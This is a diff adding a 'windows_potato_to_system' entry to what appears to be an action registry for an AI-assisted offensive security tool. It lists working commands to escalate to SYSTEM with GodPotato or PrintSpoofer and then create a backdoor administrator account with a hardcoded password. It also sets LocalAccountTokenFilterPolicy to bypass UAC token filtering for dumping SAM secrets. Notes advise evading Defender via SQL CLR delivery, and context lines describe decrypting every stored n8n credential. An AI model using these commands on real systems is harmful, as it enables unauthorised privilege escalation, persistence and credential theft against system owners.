@@ -595,6 +595,22 @@ ACTION_REGISTRY: dict[str, Action] = {
         risk="propose", runnable=False,
         note="LLM06 blast radius: the recovered key decrypts every stored n8n credential. The "
              "REST API masks values (__n8n_BLANK_VALUE), so decrypt straight from SQLite."),
+    "windows_potato_to_system": _a("windows_potato_to_system",
+        ["# GodPotato (DCOM/RPCSS OXID; arch-independent, 2019-2025) — preferred:",
+         "GodPotato.exe -cmd 'cmd /c whoami'",
+         "# EfsPotato fails on Server 2025 (EFSR mitigated: 1717 RPC_S_UNKNOWN_IF); "
+         "PrintSpoofer.exe -i -c cmd only if Spooler is running.",
+         "# SYSTEM -> durable admin + WinRM (wrap each in cmd /c under a potato):",
+         "net user opsvc Summer2026Aa /add",
+         "net localgroup Administrators opsvc /add",
+         "net localgroup \"Remote Management Users\" opsvc /add",
+         "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System "
+         "/v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"],
+        risk="propose", runnable=False,
+        note="Pick GodPotato first (works where EfsPotato/PetitPotam are mitigated). If Defender "
+             "kills the PE, deliver it via SQL CLR (mssql_sqlclr_assembly_load). "
+             "LocalAccountTokenFilterPolicy=1 defeats WinRM UAC token filtering for a non-RID-500 "
+             "local admin (needed for reg save SAM/SECURITY/SYSTEM -> secretsdump LOCAL)."),
     "mssql_sqlclr_assembly_load": _a("mssql_sqlclr_assembly_load",
         ["# build on Kali (Mono; a .NET4 DLL loads in SQL Server's CLR). class MUST be public,",
          "# Main -> public static Run(string[]), + a [SqlProcedure] wrapper (UNIQUE dbg file/call):",
